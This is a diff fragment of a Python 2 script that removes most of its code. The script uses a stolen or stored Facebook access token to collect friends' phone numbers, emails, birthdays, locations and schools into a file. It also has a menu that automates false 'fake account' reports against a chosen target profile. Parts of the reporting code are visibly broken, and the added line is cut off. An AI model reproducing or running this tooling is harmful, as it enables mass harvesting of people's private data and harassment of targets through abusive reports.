-            a = json.loads(r.text)
-            no = open(noms, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for i in a['data']:
-                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
-                z = json.loads(x.text)
-                try:
-                    hpfromfriends.append(z['mobile_phone'])
-                    no.write(z['mobile_phone'] + '\n')
-                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
-                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
-                    print 52 * '\x1b[1;97m\xe2\x95\x90'
-                except KeyError:
-                    pass
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
-            print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m: \x1b[1;97m' + noms
-            no.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;95m[!] Make file failed'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;95m[\xe2\x9c\x96] No connection'
-            keluar()
-
-def informasi():
-	os.system('reset')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;91m[!] Token not found"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('reset')
-	print logo16
-	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
-	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
-	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
-	cok = json.loads(r.text)
-	for i in cok['data']:
-		if aid in i['name'] or aid in i['id']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
-			z = json.loads(x.text)
-			print 42*"\033[1;97m♡"
-			try:
-				print '\033[1;91m[☆] \033[1;92mName\033[1;95m          : '+z['name']
-			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mID\033[1;97m            : '+z['id']
-			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;92m            : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mEmail\033[1;97m         : '+z['email']
-			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;96m         : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mTelephone\033[1;95m     : '+z['mobile_phone']
-			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
-			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;93m      : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mDate of birth\033[1;91m : '+z['birthday']
-			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
-			try:
-				print '\033[1;91m[☆] \033[1;92mSchool\033[1;97m        : '
-				for q in z['education']:
-					try:
-						print '\033[1;91m                   ~ \033[1;92m'+q['school']['name']
-					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
-			except KeyError: pass
-			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			asif()
-		else:
-			pass
-	else:
-		print"\033[1;91m[✖] User not found"
-		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		menu()
-
-def fighter():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo23
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m CoviD19 Death Report.  "
-        time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Target  Profile.  "
-        time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start   Reporting."
-        time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start   Report1.  "
-        time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start   Report2.  "
-        time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start   Report3.  "
-        time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m7.\x1b[1;92m Start   Report4.  "
-        time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             "
-	pilih_fighter()
-
-def pilih_fighter():
-	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
-	if peak =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih_fighter()
-        elif peak =="1":
-	        os.system('xdg-open https://m.facebook.com/help/contact/228813257197480?refid=69')
-	        pilih_fighter()
-	elif peak =="2":
-		report()
-        elif peak =="3":
-	        rep()
-        elif peak =="4":
-                test1()
-        elif peak =="5":
-	        test2()
-        elif peak =="6":
-	        test3()
-        elif peak =="7":
-	        test4()
-	elif peak =="0":
-		menu()
-def report():
-    try:
-        os.system('clear')
-        print logo3
-        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
-        my = ("https://m.facebook.com/"+id)
-        url = my
-        br.open(url)
-        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' BlackMafia ' + R + '  ' + W)
-        return rep()    
-    except:
-        fighter()
-def rep():
-    x = open(ids,'r')
-    y = x.read()
-    if id in y:
-        print (R+'.  Oops 405')
-        time.sleep(1)
-        time.sleep(R+'Error While Reporting the Id')
-        time.sleep(1)
-        return test1()
-    else:         
-        return test2()
-               
-def test1():
-          _bs = br.response().read()
-          bb=bs4.BeautifulSoup(_bs,
-				features="html.parser"
-			)
-          if len(bb) !=0:              
-              for x in bb.find_all("a",href=True):                  
-                  if "rapid_report" in x["href"]:                      
-                      _cadow = x["href"]                      
-                      br.open(_cadow)
-                      return test2()
-          
-def test2():
-    try:
-        br._factory.is_html=True
-        br.select_form(nr=0)
-        br.form["tag"] = ["profile_fake_account"]
-        br.submit()
-        return test3()
-    except Exception as f:
-        print (' [+] Bad404')
-                
-def test3():     
-    try:         
-        br._factory.is_html=True
-        br.select_form(nr=0)
-        br.form["action_key"] = ["FRX_PROFILE_REPORT_CONFIRMATION"]
-        br.submit()
-        return _test4()
-    except Exception as f:         
-        print ('    Bad405')
-                 
-def test4():     
-    try:         
-        br._factory.is_html=True
-        br.select_form(nr=0)
-        br.form["checked"] = ["yes"]
-        br.submit()
-        jj = open(ids,'w')
-        jj.write(_id)
-        print ''
-        time.sleep(2)
-        print (G+'[-]Reported ')
-        time.sleep(1)
-        exit()
-    except Exception as f:         
-        print ('    Bad406')
-		
-          
-if __name__ == '__main__':
-	login()
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=
